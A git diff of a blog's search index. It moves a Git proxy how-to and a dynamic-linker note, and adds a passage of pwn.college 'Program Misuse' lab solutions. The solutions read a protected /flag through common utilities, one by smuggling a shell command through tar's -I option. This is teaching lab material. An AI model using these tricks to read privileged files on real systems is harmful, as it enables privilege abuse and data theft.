@@ -1,6 +1,64 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Git proxy</title>
+    <url>/2024/06/26/Git-proxy/</url>
+    <content><![CDATA[<p><a class="link"   href="https://missing-semester-cn.github.io/2020/version-control/" >https://missing-semester-cn.github.io/2020/version-control/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><br><br><a class="link"   href="https://jiapeng.me/git-ssh-proxy/" >https://jiapeng.me/git-ssh-proxy/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="git设置代理"><a href="#git设置代理" class="headerlink" title="git设置代理"></a>git设置代理</h2><h3 id="1-使用环境变量"><a href="#1-使用环境变量" class="headerlink" title="1.使用环境变量"></a>1.使用环境变量</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure></div>
+
+<p>如果要取消，关闭当前终端再开一个就好了，上面只是一个临时设置，当然也可以运行下面的命令:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="2-git全局配置"><a href="#2-git全局配置" class="headerlink" title="2.git全局配置"></a>2.git全局配置</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line">git config --global https.proxy https://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br><span class="line">~~~~</span><br><span class="line">如果要取消的话，则运行一下命令:</span><br><span class="line">~~~bash</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="3-Git-仓库特定配置"><a href="#3-Git-仓库特定配置" class="headerlink" title="3. Git 仓库特定配置"></a>3. Git 仓库特定配置</h3><p>如果只是想为特定的 Git 仓库设置代理，可以在该仓库目录下运行以下命令：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config http.proxy http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line">git config https.proxy https://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">git config http.proxy http://127.0.0.1:7890</span><br><span class="line">git config https.proxy http://127.0.0.1:7890</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>取消的话同全局配置一样就行</p>
+<h3 id="4-使用-SSH-ProxyCommand"><a href="#4-使用-SSH-ProxyCommand" class="headerlink" title="4. 使用 SSH ProxyCommand"></a>4. 使用 SSH <code>ProxyCommand</code></h3><p>在 SSH 的配置文件（通常是 <code>~/.ssh/config</code>）中，您可以使用 <code>ProxyCommand</code> 来指定代理。这对于使用 SSH 方式连接的 Git 仓库非常有用。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  User git</span><br><span class="line">  ProxyCommand nc -x proxy.server.com:8080 %h %p</span><br></pre></td></tr></table></figure></div>
+<p>取消的话在相关文件中删除这段配置就好了。</p>
+<h3 id="5-Git-配置文件"><a href="#5-Git-配置文件" class="headerlink" title="5. Git 配置文件"></a>5. Git 配置文件</h3><p>在 <code>.gitconfig</code> 文件中（位于您的用户目录下），您可以手动编辑并添加代理配置。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[http]</span><br><span class="line">    proxy = http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line">[https]</span><br><span class="line">    proxy = https://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>取消的话在相关文件中删除这段配置就好了。</p>
+<h3 id="6-使用-Git-的core-sshCommand"><a href="#6-使用-Git-的core-sshCommand" class="headerlink" title="6. 使用 Git 的core.sshCommand"></a>6. 使用 Git 的<code>core.sshCommand</code></h3><p>可以通过设置 <code>core.sshCommand</code> 来定义 Git 应该使用的 SSH 命令，包括其中的代理设置。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.sshCommand <span class="string">&#x27;ssh -o ProxyCommand=&quot;ssh -W %h:%p proxyuser@proxy.server.com&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">git config --global core.sshCommand <span class="string">&#x27;ssh -o ProxyCommand=&quot;nc -x 127.0.0.1:7890 %h %p&quot;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>如果要取消的话，则运行一下命令:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> core.sshCommand</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="7-使用-netrc-文件"><a href="#7-使用-netrc-文件" class="headerlink" title="7. 使用 netrc 文件"></a>7. 使用 <code>netrc</code> 文件</h3><p>有时候，可能需要对 Git 仓库的认证进行代理。虽然这不是代理网络连接，但 <code>~/.netrc</code> 文件可以帮助您管理访问仓库的凭据。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">machine proxy.server.com</span><br><span class="line">login proxyuser</span><br><span class="line">password proxypwd</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>取消的话在相关文件中删除这段配置就好了。</p>
+<h2 id="git网络测试"><a href="#git网络测试" class="headerlink" title="git网络测试"></a>git网络测试</h2><h3 id="1-Ping-远程仓库服务器"><a href="#1-Ping-远程仓库服务器" class="headerlink" title="1. Ping 远程仓库服务器"></a>1. Ping 远程仓库服务器</h3><p>如果您知道远程 Git 服务器的域名，可以使用 <code>ping</code> 命令来测试网络连通性。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure></div>
+
+<p>如果 <code>ping</code> 返回了响应时间，那么您的计算机能够到达远程服务器。</p>
+<h3 id="2-使用-git-ls-remote-命令"><a href="#2-使用-git-ls-remote-命令" class="headerlink" title="2. 使用 git ls-remote 命令"></a>2. 使用 <code>git ls-remote</code> 命令</h3><p><code>git ls-remote</code> 命令允许您查询远程仓库的引用，如分支和标签。如果此命令成功，表明 Git 能够通过网络连接到远程仓库。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git ls-remote &lt;remote-url&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-使用-SSH-进行测试"><a href="#3-使用-SSH-进行测试" class="headerlink" title="3. 使用 SSH 进行测试"></a>3. 使用 SSH 进行测试</h3><p>如果通常使用 SSH 来连接到 Git 服务器，可以尝试以下命令来测试 SSH 连接：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></div>
+<p>对于 GitHub，这个命令应该返回一个消息，告诉已经成功认证，但 GitHub 不提供 shell 访问。</p>
+<h3 id="4-使用-curl-测试-HTTP-HTTPS-连接"><a href="#4-使用-curl-测试-HTTP-HTTPS-连接" class="headerlink" title="4.使用 curl 测试 HTTP&#x2F;HTTPS 连接"></a>4.使用 <code>curl</code> 测试 HTTP&#x2F;HTTPS 连接</h3><p>可以使用 <code>curl</code> 命令来测试 HTTP 或 HTTPS 连接：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -I https://github.com</span><br></pre></td></tr></table></figure></div>
+<p>这将返回 HTTP 请求的头部信息，包括响应状态码，例如 <code>200 OK</code> 表示连接成功。</p>
+<h3 id="5-检查代理设置"><a href="#5-检查代理设置" class="headerlink" title="5.检查代理设置"></a>5.检查代理设置</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --get http.proxy</span><br><span class="line">git config --global --get https.proxy</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="6-查看-Git-配置和日志"><a href="#6-查看-Git-配置和日志" class="headerlink" title="6.查看 Git 配置和日志"></a>6.查看 Git 配置和日志</h3><p>检查 Git 配置和日志也可以提供连接问题的线索：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br><span class="line">GIT_CURL_VERBOSE=1 git ls-remote &lt;remote-url&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>设置 <code>GIT_CURL_VERBOSE=1</code> 可以让 Git 在尝试网络操作时显示详细的信息。</p>
+<p>如果是<code>git push</code>的时候出问题，可以使用</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">GIT_TRACE=1 git push</span><br><span class="line">or</span><br><span class="line">GIT_CURL_VERBOSE=1 git push</span><br></pre></td></tr></table></figure></div>
+<p>这两条命令来查看<code>git push</code>时产生的输出，通过输出定位出现的问题</p>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AssembleCrash</title>
     <url>/2023/11/10/AssembleCrash/</url>
     <content><![CDATA[<h2 id="Work-with-register"><a href="#Work-with-register" class="headerlink" title="Work with register"></a>Work with register</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img  
@@ -252,12 +310,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Dynamic-link library</title>
-    <url>/2024/09/07/Dynamic-link-library/</url>
-    <content><![CDATA[<p><code>ld-linux-&lt;arch&gt;.so</code>虽然是一个动态链接库文件的后缀，但它实际上是动态链接器(也称为动态链接编辑器)。对于一个可执行目标文件，它的程序头表中有一个<code>Type=INTERP</code>的段，所以我们可以在可执行目标文件中加入一个特殊的<code>.interp</code>节，该节中包含动态链接器的路径名，然后动态链接器完成相应的重定位工作。这也就是为什么在进行一些<code>musl</code>库移植的时候，会需要把<code>ld-musl-aarch64.so</code>这个东西也移植过去，放到<code>/lib</code>下面。<br>数学库的实现不需要用到任何的系统调用（所以应该移植比较简单？）</p>
-]]></content>
-  </entry>
-  <entry>
     <title>FanControl</title>
     <url>/2024/07/29/FanControl/</url>
     <content><![CDATA[<h1 id="风扇控制"><a href="#风扇控制" class="headerlink" title="风扇控制"></a>风扇控制</h1><p>这里只记录笔者本人对蓝天模具(clevo)使用linux的过程中控制风扇的探索，如果你不是此类模具，请参考<a class="link"   href="https://wiki.archlinux.org/title/Fan_speed_control" >Fan_speed_control <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
@@ -288,62 +340,10 @@
       </tags>
   </entry>
   <entry>
-    <title>Git proxy</title>
-    <url>/2024/06/26/Git-proxy/</url>
-    <content><![CDATA[<p><a class="link"   href="https://missing-semester-cn.github.io/2020/version-control/" >https://missing-semester-cn.github.io/2020/version-control/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><br><br><a class="link"   href="https://jiapeng.me/git-ssh-proxy/" >https://jiapeng.me/git-ssh-proxy/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="git设置代理"><a href="#git设置代理" class="headerlink" title="git设置代理"></a>git设置代理</h2><h3 id="1-使用环境变量"><a href="#1-使用环境变量" class="headerlink" title="1.使用环境变量"></a>1.使用环境变量</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure></div>
-
-<p>如果要取消，关闭当前终端再开一个就好了，上面只是一个临时设置，当然也可以运行下面的命令:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="2-git全局配置"><a href="#2-git全局配置" class="headerlink" title="2.git全局配置"></a>2.git全局配置</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line">git config --global https.proxy https://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br><span class="line">~~~~</span><br><span class="line">如果要取消的话，则运行一下命令:</span><br><span class="line">~~~bash</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="3-Git-仓库特定配置"><a href="#3-Git-仓库特定配置" class="headerlink" title="3. Git 仓库特定配置"></a>3. Git 仓库特定配置</h3><p>如果只是想为特定的 Git 仓库设置代理，可以在该仓库目录下运行以下命令：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config http.proxy http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line">git config https.proxy https://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">git config http.proxy http://127.0.0.1:7890</span><br><span class="line">git config https.proxy http://127.0.0.1:7890</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>取消的话同全局配置一样就行</p>
-<h3 id="4-使用-SSH-ProxyCommand"><a href="#4-使用-SSH-ProxyCommand" class="headerlink" title="4. 使用 SSH ProxyCommand"></a>4. 使用 SSH <code>ProxyCommand</code></h3><p>在 SSH 的配置文件（通常是 <code>~/.ssh/config</code>）中，您可以使用 <code>ProxyCommand</code> 来指定代理。这对于使用 SSH 方式连接的 Git 仓库非常有用。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  User git</span><br><span class="line">  ProxyCommand nc -x proxy.server.com:8080 %h %p</span><br></pre></td></tr></table></figure></div>
-<p>取消的话在相关文件中删除这段配置就好了。</p>
-<h3 id="5-Git-配置文件"><a href="#5-Git-配置文件" class="headerlink" title="5. Git 配置文件"></a>5. Git 配置文件</h3><p>在 <code>.gitconfig</code> 文件中（位于您的用户目录下），您可以手动编辑并添加代理配置。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[http]</span><br><span class="line">    proxy = http://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line">[https]</span><br><span class="line">    proxy = https://proxyuser:proxypwd@proxy.server.com:8080</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>取消的话在相关文件中删除这段配置就好了。</p>
-<h3 id="6-使用-Git-的core-sshCommand"><a href="#6-使用-Git-的core-sshCommand" class="headerlink" title="6. 使用 Git 的core.sshCommand"></a>6. 使用 Git 的<code>core.sshCommand</code></h3><p>可以通过设置 <code>core.sshCommand</code> 来定义 Git 应该使用的 SSH 命令，包括其中的代理设置。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.sshCommand <span class="string">&#x27;ssh -o ProxyCommand=&quot;ssh -W %h:%p proxyuser@proxy.server.com&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">git config --global core.sshCommand <span class="string">&#x27;ssh -o ProxyCommand=&quot;nc -x 127.0.0.1:7890 %h %p&quot;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>如果要取消的话，则运行一下命令:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> core.sshCommand</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="7-使用-netrc-文件"><a href="#7-使用-netrc-文件" class="headerlink" title="7. 使用 netrc 文件"></a>7. 使用 <code>netrc</code> 文件</h3><p>有时候，可能需要对 Git 仓库的认证进行代理。虽然这不是代理网络连接，但 <code>~/.netrc</code> 文件可以帮助您管理访问仓库的凭据。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">machine proxy.server.com</span><br><span class="line">login proxyuser</span><br><span class="line">password proxypwd</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>取消的话在相关文件中删除这段配置就好了。</p>
-<h2 id="git网络测试"><a href="#git网络测试" class="headerlink" title="git网络测试"></a>git网络测试</h2><h3 id="1-Ping-远程仓库服务器"><a href="#1-Ping-远程仓库服务器" class="headerlink" title="1. Ping 远程仓库服务器"></a>1. Ping 远程仓库服务器</h3><p>如果您知道远程 Git 服务器的域名，可以使用 <code>ping</code> 命令来测试网络连通性。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure></div>
-
-<p>如果 <code>ping</code> 返回了响应时间，那么您的计算机能够到达远程服务器。</p>
-<h3 id="2-使用-git-ls-remote-命令"><a href="#2-使用-git-ls-remote-命令" class="headerlink" title="2. 使用 git ls-remote 命令"></a>2. 使用 <code>git ls-remote</code> 命令</h3><p><code>git ls-remote</code> 命令允许您查询远程仓库的引用，如分支和标签。如果此命令成功，表明 Git 能够通过网络连接到远程仓库。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git ls-remote &lt;remote-url&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="3-使用-SSH-进行测试"><a href="#3-使用-SSH-进行测试" class="headerlink" title="3. 使用 SSH 进行测试"></a>3. 使用 SSH 进行测试</h3><p>如果通常使用 SSH 来连接到 Git 服务器，可以尝试以下命令来测试 SSH 连接：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></div>
-<p>对于 GitHub，这个命令应该返回一个消息，告诉已经成功认证，但 GitHub 不提供 shell 访问。</p>
-<h3 id="4-使用-curl-测试-HTTP-HTTPS-连接"><a href="#4-使用-curl-测试-HTTP-HTTPS-连接" class="headerlink" title="4.使用 curl 测试 HTTP&#x2F;HTTPS 连接"></a>4.使用 <code>curl</code> 测试 HTTP&#x2F;HTTPS 连接</h3><p>可以使用 <code>curl</code> 命令来测试 HTTP 或 HTTPS 连接：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -I https://github.com</span><br></pre></td></tr></table></figure></div>
-<p>这将返回 HTTP 请求的头部信息，包括响应状态码，例如 <code>200 OK</code> 表示连接成功。</p>
-<h3 id="5-检查代理设置"><a href="#5-检查代理设置" class="headerlink" title="5.检查代理设置"></a>5.检查代理设置</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --get http.proxy</span><br><span class="line">git config --global --get https.proxy</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="6-查看-Git-配置和日志"><a href="#6-查看-Git-配置和日志" class="headerlink" title="6.查看 Git 配置和日志"></a>6.查看 Git 配置和日志</h3><p>检查 Git 配置和日志也可以提供连接问题的线索：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br><span class="line">GIT_CURL_VERBOSE=1 git ls-remote &lt;remote-url&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>设置 <code>GIT_CURL_VERBOSE=1</code> 可以让 Git 在尝试网络操作时显示详细的信息。</p>
-<p>如果是<code>git push</code>的时候出问题，可以使用</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">GIT_TRACE=1 git push</span><br><span class="line">or</span><br><span class="line">GIT_CURL_VERBOSE=1 git push</span><br></pre></td></tr></table></figure></div>
-<p>这两条命令来查看<code>git push</code>时产生的输出，通过输出定位出现的问题</p>
+    <title>Dynamic-link library</title>
+    <url>/2024/09/07/Dynamic-link-library/</url>
+    <content><![CDATA[<p><code>ld-linux-&lt;arch&gt;.so</code>虽然是一个动态链接库文件的后缀，但它实际上是动态链接器(也称为动态链接编辑器)。对于一个可执行目标文件，它的程序头表中有一个<code>Type=INTERP</code>的段，所以我们可以在可执行目标文件中加入一个特殊的<code>.interp</code>节，该节中包含动态链接器的路径名，然后动态链接器完成相应的重定位工作。这也就是为什么在进行一些<code>musl</code>库移植的时候，会需要把<code>ld-musl-aarch64.so</code>这个东西也移植过去，放到<code>/lib</code>下面。<br>数学库的实现不需要用到任何的系统调用（所以应该移植比较简单？）</p>
 ]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
   </entry>
   <entry>
     <title>Archlinux Install</title>
@@ -574,6 +574,258 @@
 ]]></content>
       <tags>
         <tag>Examine</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Program Misuse</title>
+    <url>/2023/09/24/ProgramMisuse/</url>
+    <content><![CDATA[<p>这里记录的是ASU 466课程的解题记录,<a class="link"   href="https://pwn.college/" >pwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,这一小节的题目只要学会看<code>man page</code>就能写出来。</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">more /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">less /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">emacs /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nano /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rev /flag | rev</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">od</span> -w100 -c /flag | sed <span class="string">&#x27;s# ##g&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">hd -f /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">xxd /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base32</span> /flag | <span class="built_in">base32</span> -d</span><br></pre></td></tr></table></figure></div>
+<p>注意这里不能直接<code>base32 -d /flag</code>，因为<code>-d</code>参数要有东西才能解码，所以要先用<code>base32</code>把<code>/flag</code>读出来</p>
+<h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> /flag | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">split</span> /flag</span><br><span class="line"><span class="built_in">cat</span> xaa</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gzip -c /flag | gzip -d</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bzip2 -c /flag | bzip2 -d</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">zip -r /flag.zip /flag</span><br><span class="line">unzip -p /flag</span><br></pre></td></tr></table></figure></div>
+<p>这里要注意<code>zip</code>命令的顺序，是被压缩后的名字在前，要压缩的文件在后，要加上<code>-r</code>参数</p>
+<h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tar -cvf flag.tar /flag</span><br><span class="line">tar xf flag.tar -O</span><br></pre></td></tr></table></figure></div>
+<p>or</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tar xf /flag -I <span class="string">&#x27;/bin/sh -c &quot;cat 1&gt;&amp;2&quot;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<p>第一个是延续压缩+解压的思路，下面是在网上看到的，利用<code>-I</code>参数执行额外程序的方法获得<code>flag</code></p>
+<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ar -q flag.ar /flag</span><br><span class="line"><span class="built_in">cat</span> flag.ar</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/flag&quot;</span> | cpio -o &gt; flag.cpio</span><br><span class="line"><span class="built_in">cat</span> flag.cpio</span><br></pre></td></tr></table></figure></div>
+
